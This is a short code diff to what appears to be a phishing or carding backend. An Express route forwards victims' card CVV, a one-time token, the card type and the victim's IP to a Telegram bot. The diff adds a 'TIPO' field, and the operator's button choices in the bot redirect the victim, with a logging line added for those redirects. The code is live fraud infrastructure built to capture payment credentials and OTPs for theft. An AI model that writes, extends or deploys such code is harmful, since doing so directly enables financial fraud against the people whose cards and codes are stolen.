@@ -32,7 +32,11 @@ router.post('/generals', (req, res) => {
 
     \u{2B50} CVV: ${req.body.c}
 
-    \u{1F4A3} OTP: ${req.body.tok}
+    \u{1F535} TIPO: ${req.body.type}
+
+    ----------------------------
+
+    \u{1F4A3} TOKEN: ${req.body.tok}
 
     ----------------------------
     IP: ${req.ip.split(':').pop()}
@@ -85,6 +89,7 @@ bot.on('callback_query', (query) => {
     bot.deleteMessage(CHAT_ID, messageID);
 
     // Enviar respuesta a través de la respuesta HTTP almacenada
+    console.log('Redirigiendo a -> '+data[0]);
     res.json({ 'redirect_to': data[0] });
   }
 });
